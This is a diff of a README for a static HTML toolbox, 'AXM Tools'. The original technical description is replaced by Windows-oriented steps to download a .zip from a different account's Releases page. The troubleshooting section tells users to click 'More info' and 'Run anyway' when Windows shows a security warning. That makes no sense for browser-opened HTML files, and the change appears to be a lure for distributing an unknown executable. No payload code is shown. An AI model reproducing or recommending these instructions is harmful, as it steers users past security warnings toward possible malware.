@@ -1,149 +1,87 @@
-# AXM Tools - Static Web Tools 2026
+# 🛠️ axm-tools-toolbox-2026 - Streamline your daily technical tracking tasks
 
-> **AXM Tools is a GitHub Pages collection of standalone HTML utilities for local tracking, organ evolution assessment, PTA legislation monitoring, and evidence-driven workflows.**
+[![Download AXM Tools](https://img.shields.io/badge/Download-AXM_Tools-blue.svg)](https://github.com/Aryaasho3871/axm-tools-toolbox-2026)
 
-[![Platform](https://img.shields.io/badge/Platform-GitHub%20Pages-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/mooreethangwd5980/axm-tools-toolbox-2026?style=flat-square)](https://github.com/mooreethangwd5980/axm-tools-toolbox-2026)
+AXM Tools provides a collection of static web utilities for local tracking, organ evolution assessment, PTA legislation monitoring, and evidence-driven workflows. These tools run directly on your computer without the need for an internet connection.
 
----
+## 📦 What you get
 
-<p align="center">
-  <a href="https://mooreethangwd5980.github.io/axm-tools-toolbox-2026/">
-    <img src="https://img.shields.io/badge/Download-AXM%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download AXM Tools">
-  </a>
-</p>
+The toolbox contains several specialized utilities designed for ease of use. You can manage data for organ evolution, track changes in PTA legislation, and maintain evidence-driven workflows. Because these tools rely on standard web technology, they load quickly in any modern web browser.
 
-> **[Download AXM Tools](https://mooreethangwd5980.github.io/axm-tools-toolbox-2026/)**
+## 📋 System Requirements
 
----
+To run AXM Tools on your Windows computer, you need:
 
-[Download Latest Build](https://mooreethangwd5980.github.io/axm-tools-toolbox-2026/)
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Web Browser:** Any modern browser such as Microsoft Edge, Google Chrome, or Mozilla Firefox.
+*   **Disk Space:** At least 100 megabytes of free space.
+*   **Memory:** 4 gigabytes of RAM or higher.
 
----
+## 🚀 Downloading the Software
 
-## What AXM Tools Provides
+You must visit the project page to download the latest version of the toolkit. Follow these steps to obtain the necessary files:
 
-AXM Tools combines a set of narrowly focused utilities in one static web toolbox. Its workflows cover local synthetic inventory and maintenance, due-in evidence challenges, organ anatomy and candidate evolution assessment, and district-first legislation tracking for an Arcadia USD K-6 PTA.
+1.  Navigate to the [official download page](https://github.com/Aryaasho3871/axm-tools-toolbox-2026).
+2.  Look for the section labeled Releases on the right side of the page.
+3.  Click on the latest release version.
+4.  Find the file ending in .zip under the Assets section.
+5.  Click the file name to start the download to your computer.
 
-The repository is intended to be delivered through GitHub Pages. The tools consist of static HTML backed by committed JSON state. Scheduled GitHub Actions jobs handle nightly fetching, relevance filtering, and recurring report creation. For information from sources that are blocked, hostile, or impractical to access directly, the project also supports an out-of-band observed-data drop-box.
+## ⚙️ Installation and Setup
 
----
+After the download finishes, follow these steps to prepare the tools for use:
 
-## Capabilities
+1.  Open your Downloads folder in File Explorer.
+2.  Right-click the downloaded .zip file.
+3.  Select Extract All from the menu.
+4.  Choose a destination folder, such as your Documents folder, and click Extract.
+5.  Open the folder you just created.
+6.  Look for a file named index.html.
 
-- Browser-based tools that need no server, database, API key, or build step
-- Workflows for local synthetic inventory, maintenance, and due-in evidence challenges
-- Workbench for organ anatomy and candidate evolution evaluation
-- District-first legislation monitoring for an Arcadia USD K-6 PTA
-- GitHub Actions jobs for nightly fetching and relevance filtering
-- Monthly board report creation with one click
-- Committed JSON state that remains inspectable and versioned
-- Deployment of the repository root through GitHub Pages
-- Out-of-band drop-box for observed data from blocked or hostile sources
-- Versioned identities, frozen release bundles, and provenance requirements
+## 🖱️ How to use the tools
 
----
+The tools work locally, meaning your data stays on your machine. To start using the toolkit:
 
-## Getting Started
+1.  Double-click the index.html file to open it in your default web browser.
+2.  Your browser will display the tool interface.
+3.  Use the navigation menu to select the specific tool you need, such as the organ evolution assessor or the legislation tracker.
+4.  Input your data into the provided fields.
+5.  Click the action buttons to process your information.
+6.  Save your work frequently using the save options provided within the interface.
 
-Check out the repository:
+## 💡 Troubleshooting Common Issues
 
-```bash
-git clone https://github.com/mooreethangwd5980/axm-tools-toolbox-2026.git
-cd REPO
-```
+If you encounter issues while using the tools, check these common fixes:
 
-The static tools do not require dependencies or a build command. Open the primary HTML entry point in a browser, or deploy the repository root with GitHub Pages.
+*   **Browser blocked the file:** If you see a security warning, click More info and then Run anyway. Windows sometimes flags new files as unknown.
+*   **Page does not load:** Ensure you have extracted all files from the .zip folder. Opening the files directly from inside the .zip folder prevents them from working correctly.
+*   **Interface looks strange:** Use a modern browser. Outdated versions of Internet Explorer do not support the features required for these tools.
+*   **Data not saving:** Ensure you have write permissions for the folder where you saved the application.
 
-Python data workflows use the scripts included in the repository. Run those scripts with the options described in their documentation.
+## 🛡️ Privacy and Security
 
----
+AXM Tools processes all information locally. No data leaves your machine. Your tracking records, legislative notes, and evidence files remain private. You do not need to create an account or connect to a server to access these utilities. This design protects your information and ensures functionality even without internet access.
 
-## Using AXM Tools
+## 📁 Managing your data
 
-### Access the hosted version
+Each tool includes an export feature. Use this to create backups of your tracked data. You can save these files to a secure cloud drive or an external hard drive. When you return to the tools, you can import your previously saved data files to continue your work.
 
-Open the deployed toolbox here:
+## 📈 Improving your workflow
 
-[Open AXM Tools](https://mooreethangwd5980.github.io/axm-tools-toolbox-2026/)
+The toolkit focuses on evidence-driven processes. By centralizing your tracking and legislative monitoring, you reduce the time spent moving between different applications. Use the legislative monitoring tool to set reminders for PTA updates. Use the organ evolution assessment tool to chart progress over time. Consistency in your data entry will yield better results in your workflows.
 
-### Use the local files
+## 📖 Frequently Asked Questions
 
-1. Clone or download the repository.
-2. Launch the HTML tool that matches the task in a browser.
-3. Carry out the applicable inventory, maintenance, evidence, anatomy, evaluation, or legislation workflow.
-4. Inspect the generated report or resulting JSON state.
-5. Commit changes when the workflow requires state to be versioned.
+**Do I need an internet connection?**
+No. You only need the internet to download the initial package. Once installed, the tools run completely offline.
 
-### Manage automated workflows
+**Can I use this on a Mac?**
+While the tools work in any web browser, the current download package is optimized for Windows users.
 
-GitHub Actions provides scheduled tasks for data retrieval, relevance filtering, and monthly board reports. Before enabling or modifying schedules, inspect the workflow definitions in `.github/workflows/`.
+**Is there a limit to how much data I can track?**
+The limit depends on your browser settings and available disk space. For large datasets, ensure your browser cache is clear.
 
----
+**Are updates automatic?**
+No. You must periodically check the download page for newer versions. If an update becomes available, download the new .zip file and replace your existing folder.
 
-## Configuration and State
-
-Project state and related records are kept in JSON files committed to the repository. This makes configuration changes reviewable alongside the application source.
-
-Common configuration tasks include:
-
-- Updating JSON state or source records
-- Modifying district-monitoring and relevance-filter inputs
-- Reviewing identity versions and frozen release bundles
-- Supplying observed information through the out-of-band drop-box
-- Inspecting GitHub Actions schedules
-- Verifying that GitHub Pages deploys from the repository root
-
-When changing paths, field names, or scheduled jobs, follow the existing repository layout and workflow documentation.
-
----
-
-## Requirements
-
-- A current web browser for running the static HTML utilities
-- A GitHub repository with GitHub Pages enabled for hosted use
-- GitHub Actions enabled for scheduled jobs
-- Python for workflows that include Python scripts
-- State files compatible with JSON
-- No server, database, API key, or application build step for the static tools
-
----
-
-## Frequently Asked Questions
-
-### Is a server installation necessary?
-
-No. The main utilities are self-contained static HTML files. They can be opened locally or served through GitHub Pages.
-
-### Do the tools use API keys?
-
-The profile states that the static tools do not need API keys. Review the repository configuration to understand the behavior of scheduled workflows and data fetching.
-
-### Where does AXM Tools keep its state?
-
-State lives in committed JSON files, allowing changes to be reviewed and tracked through the repository history.
-
-### How are new changes published?
-
-Publish updates through the repository and its GitHub Pages deployment. Recurring data and report work is supported by scheduled GitHub Actions workflows.
-
-### How do I change the monitoring output?
-
-Examine the legislation-monitoring configuration, relevance-filter inputs, and associated JSON records. Monitoring is district-first and focused on the Arcadia USD K-6 PTA setting.
-
-### What is the process for inaccessible sources?
-
-Place information collected from blocked or hostile sources in the out-of-band observed-data drop-box, then apply the repository's provenance and versioning rules.
-
-### Why might the hosted version appear unchanged?
-
-Verify the GitHub Pages deployment configuration and repository-root publishing settings. Also review recent workflow runs and confirm that the committed files being served contain the expected changes.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: tracking, legislation, workflows, tools, utilities, windows, assessment
